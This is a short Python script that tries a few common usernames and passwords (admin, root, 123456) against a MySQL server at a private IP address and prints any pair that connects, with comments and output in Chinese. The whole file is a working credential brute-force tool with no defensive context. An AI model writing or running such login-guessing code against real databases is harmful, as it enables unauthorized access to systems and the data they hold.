import pymysql
target_host = "192.168.33.41"
target_port = 3306
user_list = ["admin","root"]
pw_list = ["admin","root","123456"]
# 尝试账户名与密码是否正确
i = 0
for user in user_list:
    for passwd in pw_list:
        try:
            res = pymysql.connect(host=target_host, port=target_port, user=user, password=passwd)
            print("连接成功，当前的主机：{},端口：{}，用户名：{}，密码：{}".format(target_host, target_port, user, passwd))
            i = 1
            break
        except Exception as e:
            pass
    if i == 1:
        break